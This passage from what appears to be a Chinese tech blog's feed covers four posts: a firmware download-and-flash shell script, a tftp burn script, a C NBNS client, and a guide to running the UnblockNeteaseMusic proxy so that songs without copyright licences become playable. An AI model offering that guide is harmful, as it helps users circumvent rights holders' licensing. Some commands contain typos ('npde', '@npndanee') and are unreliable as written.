ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;smslit&lt;/A&gt;    &lt;DT&gt;&lt;A HREF=&quot;https://github.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;github&lt;/A&gt;    &lt;DT&gt;&lt;A HREF=&quot;https://coding.net/user&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;coding&lt;/A&gt;    &lt;/DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;论坛(forum)&lt;/H3&gt;    &lt;DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;A HREF=&quot;https://blog.coding.net/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Coding 博客&lt;/A&gt;    &lt;DT&gt;&lt;A HREF=&quot;http://www.ituring.com.cn/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;图灵社区&lt;/A&gt;    &lt;DT&gt;&lt;A HREF=&quot;http://www.elecfans.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;电子发烧友&lt;/A&gt;    &lt;/DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;编程(Programming)&lt;/H3&gt;    &lt;DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;算法(Algorithm)&lt;/H3&gt;    &lt;DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;A HREF=&quot;http://www.acmerblog.com/&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;Acm之家&lt;/A&gt;    &lt;DT&gt;&lt;A HREF=&quot;http://www.pythontip.com/acm/problemCategory&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;各大OJ题目分类&lt;/A&gt;    &lt;/DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;H3 ADD_DATE=&quot;1588501602&quot; LAST_MODIFIED=&quot;1588501602&quot;&gt;linux&lt;/H3&gt;    &lt;DL&gt;&lt;p&gt;    &lt;DT&gt;&lt;A HREF=&quot;http://elixir.free-electrons.com/linux/latest/source&quot; ADD_DATE=&quot;1588501602&quot; ICON=&quot;data:image/png;base64,None&quot;&gt;linux - Elixir - Free Electrons&lt;/A&gt;&lt;/DL&gt;&lt;p&gt;</code></pre><p>最后导入Chrome看下，Chrome会添加一个新的文件夹<strong>已导入</strong>，我们可以把子文件夹拖出来就ok了，再看看图标，如果最近有访问过，其实不加icon的base64信息也是可以显示出来的，就算现在没有，以后只要访问过一次就会自动更新，这点倒是有点像交换机的学习机制。</p><p><img src="/assets/chrome/favorite.png" alt="favorites"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>这个脚本也已经更新到了<a href="https://github.com/Litreily/Python-scripts/blob/master/md2bm/mb2bm.py">GitHub Litreily/Python-scripts</a>，欢迎有需要的小伙伴们使用。</p>]]></content>
      
      
      <categories>
          
          <category> Language </category>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
            <tag> chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解锁网易云音乐灰色无版权歌曲</title>
      <link href="2020/05/03/netease/"/>
      <url>2020/05/03/netease/</url>
      
        <content type="html"><![CDATA[<p>由于版权之争，网易云的很多歌曲都灰掉并且无法播放了，想要使其可以播放还是有办法的，万能的Google和Github让我找到了<a href="https://github.com/nondanee/UnblockNeteaseMusic">答案</a>，直接上享用方法吧。</p><h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul><li>一个可以远程访问的服务器，比如vps，阿里云、腾讯云、...</li><li>如果没有服务器，只能寻找别人搭建好的服务</li></ul><h2 id="搭建服务"><a href="#搭建服务" class="headerlink" title="搭建服务"></a>搭建服务</h2><p>在服务器端，首先安装依赖的工具<code>npx</code>，如果有则忽略</p><pre><code class="zsh">sudo apt install npmsudo npm i -g npx</code></pre><p>然后clone项目UnblockNeteaseMusic.git到本地</p><pre><code class="zsh">git clone git@github.com:nondanee/UnblockNeteaseMusic.gitcd UnblockNeteaseMusic</code></pre><p>接下来是运行服务，有好几种方式，下面介绍3种</p><h3 id="npx启动"><a href="#npx启动" class="headerlink" title="npx启动"></a>npx启动</h3><p>第一种，最简单的是直接用npx启动，默认以8080端口打开</p><pre><code class="zsh">npx @npndanee/unblockneteasemusic</code></pre><h3 id="node启动"><a href="#node启动" class="headerlink" title="node启动"></a>node启动</h3><p>第二种方式，使用node, <code>-p</code>参数指定端口</p><pre><code class="zsh">npde app.js -p 4321</code></pre><h3 id="搭建系统服务"><a href="#搭建系统服务" class="headerlink" title="搭建系统服务"></a>搭建系统服务</h3><p>第三种，使用服务方式，方便管理和查看状态</p><pre><code class="zsh"># 新建服务# 注意填写的路径是clone的UnblockNeteaseMusic所在目录sudo cat &gt; /etc/systemd/system/UnblockNeteaseMusic.service &lt;&lt;EOF[Unit]Description=UnblockNeteaseMusicAfter=network.targetWants=network.target[Service]Type=simplePIDFile=/var/run/UnblockNeteaseMusic.pidWorkingDirectory=/home/litreily/UnblockNeteaseMusicExecStart=/home/litreily/UnblockNeteaseMusic/app.js -p 4321RestartPreventExitStatus=23Restart=always[Install]WantedBy=multi-user.targetEOF# 添加app.js的执行权限，不添加可能无法启动服务sudo chmod a+x app.js# 启动、停止、重启、查看服务systemctl start UnblockNeteaseMusic.servicesystemctl stop UnblockNeteaseMusic.servicesystemctl restart UnblockNeteaseMusic.servicesystemctl status UnblockNeteaseMusic.service</code></pre><p>除了这三种以外，还可以使用Docker，具体参考github文档即可</p><h2 id="使用代理"><a href="#使用代理" class="headerlink" title="使用代理"></a>使用代理</h2><p>在服务器端搭建好了代理，就需要在我们的客户端使用它咯，在windows上，网易云音乐不管UWP应用还是普通安装应用都是直接设置代理的。</p><p><img src="/assets/music/netease-proxy.png" alt="网易云音乐代理"></p><p>当然，也可以使用其它工具设置代理，比如小飞机、系统代理等等，因为这个代理已经实现了完整的http/https服务，所以也是可以作为全局代理使用的，不过我已经使用其它代理用于科学上网，所以就只在网易云配置下代理就好了。</p><p>该工具非常强大，代理配置好后，我看了下之前灰掉的歌曲，确实可以正常播放了，amazing!</p><p><img src="/assets/stickers/cheers.gif" alt="cheers"></p><p>该工具也适用于其它系统和移动端，有需要的可以尝试下。最后提醒下各位，有能力的还是支持正版，同时也请低调使用。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://github.com/nondanee/UnblockNeteaseMusic">Github UnblockNeteaseMusic</a></li><li><a href="https://www.nange.cn/unlock-netease-music.html">解锁网易云音乐灰色无版权歌曲，使其变为正常可听可下载状态</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Media </category>
          
      </categories>
      
      
        <tags>
            
            <tag> music </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lftp获取FTP Server端最新文件</title>
      <link href="2020/04/30/lftp_get/"/>
      <url>2020/04/30/lftp_get/</url>
      
        <content type="html"><![CDATA[<p>最近解一个bug，要频繁编译和烧录FW，每次都要将image从远程的FTP server手动copy到本地，然后使用tftp进行烧录，实在不胜其烦。虽然上一篇<a href="https://www.litreily.top/2020/04/27/tftp/">简单实用的tftp烧录image脚本</a>提高了烧录效率，但是每次将image拷贝到本地也是麻烦。</p><p>这次，我依旧想到了WSL, 使用shell脚本还是更加方便快捷，思路很简单，检查server端的最新文件，得到文件名后使用lftp下载到本地。</p><h2 id="获取最新文件"><a href="#获取最新文件" class="headerlink" title="获取最新文件"></a>获取最新文件</h2><p>FTP Server文件存储方式是将每天的新数据归档到以当日日期命名的文件夹中，如今天<code>20200430</code></p><pre><code class="zsh">➜  lftp -u &quot;username,password&quot; ftp://1.2.3.4lftp username@1.2.3.4:~&gt; ls04-27-20  02:03PM       &lt;DIR&gt;          2020042704-29-20  05:36PM       &lt;DIR&gt;          2020042904-30-20  01:11PM       &lt;DIR&gt;          20200430lftp username@1.2.3.4:/&gt; cd 20200430lftp username@1.2.3.4:/20200430&gt; ls04-30-20  08:45AM             25165953 20200430084545-FW-V1.2.1.4.img04-30-20  09:09AM             25165953 20200430090947-FW-V1.2.1.4.img04-30-20  10:04AM             25165953 20200430100405-FW-V1.2.1.4.img04-30-20  11:02AM             25165953 20200430110247-FW-V1.2.1.4.img04-30-20  01:11PM             25165953 20200430131110-FW-V1.2.1.4.imglftp username@1.2.3.4:/20200430&gt; exit➜  </code></pre><p>所以获取当日文件列表时需要先进入目录，然后ls并将结果存到本地tmp文件</p><pre><code class="zsh">dir=$(date &#39;+%Y%m%d&#39;)lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF &gt; $tmpfile    cd $dir    lsEOF</code></pre><p>由于ls结果默认以时间顺序排序，最新文件在最后一行，这就好办了，结合<code>tail</code>和<code>awk</code>就可以得到最新文件名。</p><pre><code class="zsh">image=$(tail -1 $tmpfile |awk &#39;&#123;print $4&#125;&#39;)</code></pre><p>知道了文件名，先看下本地有没有下载过，如果有则无需重复下载，如果没有就使用<code>lftp</code>的<code>get</code>指令下载到本地。</p><pre><code class="zsh"># return if $image already exist in local[ -f $image ] &amp;&amp; return[ &quot;x$image&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;no image today&quot; &amp;&amp; exit 1lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF    cd $dir    get $imageEOF</code></pre><p>以上就完成了最新image的获取，结合之前使用<code>tftp</code>烧录image的脚本，更新shell脚本得到下面的完整代码。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre><code class="zsh">#!/bin/zsh# download image from FTP server and burn it into router with tftpburn()&#123;    tftp 192.168.1.1 &lt;&lt;-EOF &gt; /dev/null        binary        put $1    EOF&#125;dl_newest_image()&#123;    ftp_user=&quot;username&quot;    ftp_pass=&quot;password&quot;    ftp_host=&quot;ftp://1.2.3.4&quot;    tmpfile=~/tmp/ftp_list    # get ftp file list of today    dir=$(date &#39;+%Y%m%d&#39;)    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF &gt; $tmpfile        cd $dir        ls    EOF    image=$(tail -1 $tmpfile |awk &#39;&#123;print $4&#125;&#39;)    # return if $image already exist in local    [ -f $image ] &amp;&amp; return    [ &quot;x$image&quot; = &quot;x&quot; ] &amp;&amp; echo &quot;no image today&quot; &amp;&amp; exit 1    lftp -u &quot;$ftp_user,$ftp_pass&quot; $ftp_host &lt;&lt;-EOF        cd $dir        get $image    EOF&#125;cd $DT/tmp/imgs/ # $DT代表Win10的Desktop, 是我.zshrc的一个环境变量image=$1if [ &quot;x$1&quot; = &quot;x&quot;  ]; then    dl_newest_imagefiecho &quot;start burning $image&quot;burn $image</code></pre><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><p>为了方便，脚本文件名更新为<code>bi</code>, burn image的意思，使用方法含带参和不带参两种。</p><ol><li>带参 - 烧录指定文件</li><li>不带参 - 从FTP server获取最新文件并烧录</li></ol><pre><code class="zsh">➜  bi 20200430110247-FW-V1.2.1.4.imgstart burning 20200430110247-FW-V1.2.1.4.img➜  bi`20200430131128-RBR20-V2.7.1.8RC1-ubi4.img` at 15953920 (45%) 7.41M/s eta:2s [Receiving data]start burning 20200430131128-RBR20-V2.7.1.8RC1-ubi4.img</code></pre><h2 id="Notice"><a href="#Notice" class="headerlink" title="Notice"></a>Notice</h2><ol><li>其实使用<code>curl</code>也可以获取FTP Server的列表信息，使用<code>wget</code>也可以下载FTP Server文件，但是鉴于公司网络代理环境复杂，容易莫名失败，所以还是使用<code>lftp</code>；</li><li>用户名密码不该直接放脚本内部，可以单独存到配置文件并设置好权限，然后脚本去读文件，当然啦，私人电脑忽略；</li><li>脚本中<code>&lt;&lt;-EOF</code>的<code>-</code>表示忽略下面输入行每行开始的tab键，所以被<code>EOF</code>包含的部分不能使用空格键替代tab键，否则会出错。</li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> ftp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单实用的tftp烧录image脚本</title>
      <link href="2020/04/27/tftp/"/>
      <url>2020/04/27/tftp/</url>
      
        <content type="html"><![CDATA[<p>烧录FW image时，经常需要打开带有UI界面的tftp客户端，然后输入IP，选择FW image，然后点击写入，很是繁琐。</p><p>为了简化这个过程，我决定使用shell script，在win10中自带WSL(windows subsystem for linux)，配合zsh食用。</p><pre><code class="zsh">#!/bin/zsh# install to ~/bin/burnImage[ &quot;x$1&quot; = &quot;x&quot;  ] &amp;&amp; echo &quot;usage: $&#123;0##*/&#125; &lt;imagefile&gt;&quot; &amp;&amp; exit 1tftp 192.168.1.1 &lt;&lt;-EOF &gt; /dev/null    binary    put $1EOF</code></pre><p>脚本使用<code>tftp</code>连接tftp server 192.168.1.1, 然后进入<code>binary</code>模式，最后将image文件<code>$1</code>传输至server端。</p><p>使用方法很简单，保证该文件<code>burnImage</code>所在目录在环境变量<code>$PATH</code>中，之后在FW image所在目录执行以下指令完成烧录，非常方便。</p><pre><code class="zsh">burnImage FW.img</code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> tftp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NBNS客户端的C语言实现</title>
      <link href="2020/03/15/nbns_code/"/>
      <url>2020/03/15/nbns_code/</url>
      
        <content type="html"><![CDATA[<p>接上一篇<a href="/2020/02/28/nbns/">【网络协议详解1 - NBNS】</a>对NBNS的介绍，这一篇将要讲述使用C语言如何实现一个NBNS客户端，用于向局域网内其它设备发送NBNS NODE STATUS QUERY，并将接收到的RESPONSE信息打印出来。其实也就是一个UDP socket的实例。</p><p><img src="/assets/network/udp-socket.png" alt="UDP socket flowchart"></p><p>编写一个客户端，首先要清楚它要完成什么任务，进而确定完成任务的方法和步骤。其任务很简单，就是NBNS数据包的发送和接收，也就是一个简单的socket收发进程。实现主要分以下几步：</p><ol><li><strong>组包</strong>得到NBNS NODE STATUS QUERY</li><li>发送NBNS NODE STATUS QUERY</li><li>接收RESPONSE并解析</li></ol><h2 id="include-amp-define"><a href="#include-amp-define" class="headerlink" title="include &amp; define"></a>include &amp; define</h2><p>首先来看看编写该客户端会用到的头文件及相关宏定义</p><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt; /* for exit */#include &lt;string.h&gt; /* for memset */#include &lt;unistd.h&gt; /* for close */#include &lt;sys/socket.h&gt; /* for socket, bind */#include &lt;sys/time.h&gt; /* for timeval */#include &lt;netinet/in.h&gt; /* for socksaddr_in */#include &lt;arpa/inet.h&gt; /* for htons */#define NBNS_PORT 137#define NBNS_TYPE_NB 0x0020#define NBNS_TYPE_NBSTAT 0x0021#define NBNS_CLASS_IN 0x0001#define BUFFER_SIZE 1024 /* buffer size for recv packet */#define IP_SIZE 16 /* length of IP address like 192.168.1.1 */</code></pre><p>关于NBNS，其公知的端口号是137，在发送请求时会在目的地址中用到。</p><h2 id="组包结构体"><a href="#组包结构体" class="headerlink" title="组包结构体"></a>组包结构体</h2><p>根据上一篇的内容，我们可以知道NBNS NODE STATUS的请求包和响应包的数据格式，据此可以编写相应的结构体。</p><pre><code class="c">typedef unsigned int uint32;typedef unsigned short uint16;typedef unsigned char uint8;struct nbns_header &#123;    uint16 tid; /* Transaction ID */    uint16 flags;    uint16 question;    uint16 answer;    uint16 authority;    uint16 additional;&#125; __attribute__ ((packed));// NBNS NODE STATUS QUERY FORMATstruct nbns_request &#123;    struct nbns_header header;    char qname[34];    uint16 qtype;    uint16 qclass;&#125; __attribute__ ((packed));struct nbns_name &#123;    char name[16];    uint16 flags;&#125; __attribute__ ((packed));// NBNS NODE STATUS RESPONSE FORMATstruct nbns_response_header &#123;    struct nbns_header header;    char rname[34];    uint16 rtype;    uint16 rclass;    uint32 ttl;    uint16 length;    uint8 num_of_names;&#125; __attribute__ ((packed));</code></pre><p>注意每个结构体后的<code>__attribute__ ((packed))</code>，这是为了告诉编译器不要对其进行对齐优化，保持数据的紧凑性，以防数据解析出错。</p><h2 id="名称编解码"><a href="#名称编解码" class="headerlink" title="名称编解码"></a>名称编解码</h2><p>在进入正题之前，我们先来看下NetBIOS名称的编解码，这在后续发送请求和解析响应中都会用到。从RFC1001可知，NBNS请求包中的Name是被编码的，在<a href="/2020/02/28/nbns/#NetBIOS-%E5%91%BD%E5%90%8D%E7%BC%96%E7%A0%81">上一篇</a>中已经讲述过了。</p><h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><p>对于NODE STATUS QUERY, 通常将NBNS name设为<code>*</code>, 就是一个通配符，使用下面的函数可以对其编码。</p><pre><code class="c">// encode &quot;*&quot; to &quot;CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;void encode_name(char *name)&#123;    int i;    name[0] = 0x20; /* length of name */    name[1] = ((&#39;*&#39; &gt;&gt; 4) &amp; 0x0F) + &#39;A&#39;;    name[2] = (&#39;*&#39; &amp; 0x0F) + &#39;A&#39;;    for (i = 3; i &lt; 33; i++)        name[i] = &#39;A&#39;;    name[i] = &#39;\0&#39;; /* end of name */&#125;</code></pre><h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><p>解码也很简单，就是编码的逆过程。上面的编码函数只针对<code>*</code>，但这里的解码函数却是针对所有满足格式要求的字符串。</p><pre><code class="c">void decode_name(char *name, char *dst)&#123;    int i;    if (name[0] != 0x20)        return;    for (i = 1; i &lt; 0x20; i+=2)        dst[i/2] = (((name[i]-&#39;A&#39;) &lt;&lt; 4) &amp; 0xF0) + ((name[i+1]-&#39;A&#39;) &amp; 0x0F);      dst[i/2] = &#39;\0&#39;;&#125;</code></pre><h2 id="create-socket"><a href="#create-socket" class="headerlink" title="create socket"></a>create socket</h2><h3 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h3><p>好了，进入正题。在执行数据收发之前需要创建UDP socket, 这里会用到socket函数。</p><pre><code class="c">#include &lt;sys/socket.h&gt;int socket(int domain, int type, int protocol);RETURN VALUE       On success, a file descriptor for the new socket is returned.         On error, -1 is returned, and errno is set appropriately.</code></pre><p>下面简要介绍下相关参数。</p><ul><li><p>domain<br>常见的网络通信域domain主要有<code>AF_UNIX</code>, <code>AF_INET</code>, <code>AF_INET6</code>, <code>AF_NETLINK</code>，对于常见的TCP/UDP传输，基于IPv4协议，我们选择<code>AF_INET</code>即可。</p></li><li><p>type<br>type代表socket类型，常用的包含针对TCP的<code>SOCK_STREAM</code>、针对UDP的<code>SOCK_DGRAM</code>，以及针对需要访问源网络数据（应用层以下数据）的<code>SOCK_RAW</code>。显然本文使用的是<code>SOCK_DGRAM</code>.</p></li><li><p>protocol<br>protocol通常设为0，当然也可以针对协议进行配置，比如UDP对应的<code>IPPROTO_UDP</code>，其中IPPROTO是IP Protocol的缩写。</p></li></ul><h3 id="创建socket"><a href="#创建socket" class="headerlink" title="创建socket"></a>创建socket</h3><p>下面来实现一个open_socket函数，用于打开一个socket，可以把它当做一个信封，等待后面写好信件放进去。</p><pre><code class="c">int open_socket(void)&#123;    int sock;    struct sockaddr_in saddr;    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);    if (sock &lt; 0)        handle_error(&quot;socket&quot;);    memset(&amp;saddr, 0, sizeof(saddr));    saddr.sin_family = AF_INET;    saddr.sin_port = 0;    saddr.sin_addr.s_addr = htonl(INADDR_ANY);    if (bind(sock, (struct sockaddr *)&amp;saddr, sizeof(saddr)) == -1)        handle_error(&quot;bind&quot;);    return sock;&#125;</code></pre><p>这里要注意几点：</p><ol><li>网络字节序和主机字节序不一定一样，需要使用<code>htonl</code>, <code>htons</code>函数进行转换<ul><li>h - host</li><li>n - network</li><li>s - short 2个字节</li><li>l - long 4个字节</li></ul></li><li>源地址的端口port设为0，代表由网络协议栈分配</li><li>bind函数用于绑定发送地址，类似于往信封上写好寄信人的地址信息</li><li>handle_error是一个异常处理函数，检测到错误后调用其打印错误信息并退出程序。</li></ol><h2 id="发送请求"><a href="#发送请求" class="headerlink" title="发送请求"></a>发送请求</h2><h3 id="sendto"><a href="#sendto" class="headerlink" title="sendto"></a>sendto</h3><p>发送函数包括组包和发送两部分，将请求信息按照组包格式逐一赋值，然后通过<code>sendto</code>发送数据包。</p><pre><code class="c">#include &lt;sys/socket.h&gt;ssize_t sendto(int sockfd, const void *buf, size_t len, int flags,               const struct sockaddr *dest_addr, socklen_t addrlen);RETURN VALUE       On success, these calls return the number of bytes sent.       On error, -1 is returned, and errno is set appropriately.</code></pre><p>发送成功则返回真实的发送字节数，否则返回-1并更新errno.</p><h3 id="发送数据"><a href="#发送数据" class="headerlink" title="发送数据"></a>发送数据</h3><pre><code class="c">int send_nbns_query(int sock, struct in_addr dest_ip)&#123;    struct sockaddr_in dest;    struct nbns_request req;    memset(&amp;dest, 0, sizeof(dest));    dest.sin_family = AF_INET;    dest.sin_port = htons(NBNS_PORT);    dest.sin_addr = dest_ip;    req.header.tid = htons(1);    req.header.flags = htons(0x0000);    req.header.question = htons(1);    req.header.answer = 0;    req.header.authority = 0;    req.header.additional = 0;    encode_name(req.qname);    req.qtype = htons(NBNS_TYPE_NBSTAT);    req.qclass = htons(NBNS_CLASS_IN);    return sendto(sock, (char *)&amp;req, sizeof(req), 0,           (struct sockaddr *)&amp;dest, sizeof(dest));&#125;</code></pre><p>注意，除了0、单字节数据、单字节数组外，其余数据都需要使用<code>htons</code>或<code>htonl</code>进行转换，将主机字节序转换为网络字节序。</p><h2 id="接收响应"><a href="#接收响应" class="headerlink" title="接收响应"></a>接收响应</h2><h3 id="recvfrom"><a href="#recvfrom" class="headerlink" title="recvfrom"></a>recvfrom</h3><p>发送请求后，便可以使用<code>recvfrom</code>函数接收响应数据了。</p><pre><code class="c">#include &lt;sys/socket.h&gt;ssize_t recvfrom(int sockfd, void *buf, size_t len, int flags,                 struct sockaddr *src_addr, socklen_t *addrlen);RETURN VALUE    These calls return the number of bytes received, or -1 if an error occurred.    In the event of an error, errno is set to indicate the error.    Datagram sockets in various domains permit zero-length datagrams.    When such a datagram is received, the return value is 0.</code></pre><p>接收成功返回接收到的字节数，否则返回-1。当然如何接收字节为0则返回0.</p><h3 id="接收数据"><a href="#接收数据" class="headerlink" title="接收数据"></a>接收数据</h3><pre><code class="c">void recv_nbns_response(int sock)&#123;    struct timeval tv;    struct sockaddr_in src_addr;    socklen_t src_len = sizeof(src_addr);    ssize_t recv_len = 0;    char res_buf[BUFFER_SIZE];    char src_ip[IP_SIZE] = &#123;0&#125;;    tv.tv_sec = 5;    tv.tv_usec = 0;    /* set timeout 5s for some not exist PC */    if (setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &amp;tv, sizeof(tv)) &lt; 0)        handle_error(&quot;setsockopt&quot;);    recv_len = recvfrom(sock, (char *)res_buf, BUFFER_SIZE, 0,        (struct sockaddr *)&amp;src_addr, &amp;src_len);    if (recv_len &lt; 0)        handle_error(&quot;recvfrom&quot;);    else if (recv_len &lt; sizeof(struct nbns_response_header))        return;    inet_ntop(AF_INET, (struct in_addr *)&amp;src_addr.sin_addr,        (char *)&amp;src_ip, IP_SIZE);    printf(&quot;recv response from %s : %ld Bytes\n&quot;, src_ip, recv_len);    show_nbns_response(res_buf);&#125;</code></pre><p>该函数通过<code>recvfrom</code>接收数据并存入字符数组<code>res_buf</code>中，同时可以保存发送方的地址信息并通过<code>inet_ntop</code>转换为点分十进制IP地址。最后通过调用函数<code>show_nbns_response</code>打印解析数据。</p><p>接收过程中，要考虑到数据来源的一方不存在的情况，也就是永远收不到数据的情况，比如请求IP地址为<code>192.168.1.10</code>的设备，但此刻该设备关机了。为此，我们需要设置超时时间，通过<code>setsockopt</code>函数可以配置socket相关的可选项，当发生超时时，进行错误处理并退出。</p><h3 id="打印输出"><a href="#打印输出" class="headerlink" title="打印输出"></a>打印输出</h3><p>接收数据后会调用<code>show_nbns_response</code>函数进行打印输出。</p><pre><code class="c">void show_nbns_response(char *buf)&#123;    struct nbns_response_header *res;    struct nbns_name *pname, *pend;    char rname[18] = &#123;0&#125;;    char echar = &#39;\0&#39;;    res = (struct nbns_response_header *)buf;    decode_name(res-&gt;rname, rname);    printf(        &quot;Transaction: %d\n&quot; \        &quot;Flags: 0x%04x\n&quot; \        &quot;Questions: %d\n&quot; \        &quot;Answers: %d\n&quot; \        &quot;Authority: %d\n&quot; \        &quot;Additional: %d\n&quot; \        &quot;RR_Name: %s (%s)\n&quot; \        &quot;RR_Type: %s\n&quot; \        &quot;RR_Class: %s\n&quot; \        &quot;TTL: %d\n&quot; \        &quot;Data length: %d\n&quot; \        &quot;\nNumber of names: %d\n&quot;,        ntohs(res-&gt;header.tid),        ntohs(res-&gt;header.flags),        ntohs(res-&gt;header.question),        ntohs(res-&gt;header.answer),        ntohs(res-&gt;header.authority),        ntohs(res-&gt;header.additional),        res-&gt;rname + 1, rname,        ntohs(res-&gt;rtype) == NBNS_TYPE_NBSTAT ? &quot;NBSTAT (33)&quot; : &quot;NB (32)&quot;,        ntohs(res-&gt;rclass) == NBNS_CLASS_IN ? &quot;IN (1)&quot; : &quot;UNKNOWN&quot;,        ntohl(res-&gt;ttl),        ntohs(res-&gt;length),        res-&gt;num_of_names);    pname = (struct nbns_name *)&amp;buf[sizeof(struct nbns_response_header)];    pend = pname + res-&gt;num_of_names;    printf(&quot;---------------------------\n&quot;);    for (; pname &lt; pend; pname++ ) &#123;        /* ignore the last byte of name*/        echar = pname-&gt;name[15];        pname-&gt;name[15] = &#39;\0&#39;;        printf(&quot;Name: %s&lt;%02x&gt;\n&quot;, pname-&gt;name, echar);        printf(&quot;Name flags: 0x%04x\n&quot;, ntohs(pname-&gt;flags));        printf(&quot;---------------------------\n&quot;);    &#125;&#125;</code></pre><p>由于不清楚发送方究竟会发送多少组名称，所以先从缓存数组中读取头部信息，然后根据头部信息提供的num_of_names确定名称格式，再逐一打印出来。读取数据的过程就像是收件方接收到信件然后进行阅读一样。</p><p>注意，这里有用到<code>ntohs</code>, <code>ntohl</code>进行字节序的转换，同时有用到decode_name进行名称的解码。</p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>最后简单描述下异常处理函数<code>handle_error</code>, 其实很简单，就是在发生错误的情况下关闭资源，打印错误信息，最后退出程序。</p><pre><code class="c">int nbns_sock; /* global value */static inline void handle_error(char *msg)&#123;    if (nbns_sock &gt;= 0)        close(nbns_sock);    perror(msg);    exit(EXIT_FAILURE);&#125;</code></pre><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><p>程序编写完成，使用<code>gcc</code>编译即可，下面给出测试用例↓</p><pre><code class="bash">➜ nbnstat 192.168.1.1Send nbns query to 192.168.1.1recv response from 192.168.1.1 : 247 BytesTransaction: 1Flags: 0x8580Questions: 0Answers: 1Authority: 0Additional: 0RR_Name: CKAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (*)RR_Type: NBSTAT (33)RR_Class: IN (1)TTL: 0Data length: 191Number of names: 8---------------------------Name: SMBSHARE       &lt;00&gt;Name flags: 0x4400---------------------------Name: SMBSHARE       &lt;03&gt;Name flags: 0x4400---------------------------Name: SMBSHARE       &lt;1f&gt;Name flags: 0x4400---------------------------Name: SMBSHARE       &lt;20&gt;Name flags: 0x4400---------------------------Name: __MSBROWSE__&lt;01&gt;Name flags: 0xc400---------------------------Name: WORKGROUP      &lt;00&gt;Name flags: 0xc400---------------------------Name: WORKGROUP      &lt;1d&gt;Name flags: 0x4400---------------------------Name: WORKGROUP      &lt;1e&gt;Name flags: 0xc400---------------------------</code></pre><p>除了flags信息使用原有的16进制表示外，其余数据均以整型或字符串形式显示。</p><p>上面是正常情况，下面给出两个异常情况的例子。</p><pre><code class="bash">➜  nbnstat 192.168.1.10Send nbns query to 192.168.1.10recvfrom: Resource temporarily unavailable➜  nbnstat 192.16Not in presentation format</code></pre><ol><li>第1个是指定IP设备不存在，然后产生超时错误；</li><li>第2个是指定IP格式不正确，提示格式错误。</li></ol><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本文介绍了一个简单<strong>NBNS客户端</strong>的具体实现，该客户端用于向指定IP设备发送NBNS NODE STATUS QUERY，并对请求结果予以分析和打印。涉及到的Socket API函数有socket, bind, sendto, recvfrom, htons, htonl, ntohs, ntohl, inet_pton, setsockopt等。</p>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用油猴脚本批量下载canvas图片</title>
      <link href="2020/03/15/canvas-dl/"/>
      <url>2020/03/15/canvas-dl/</url>
      
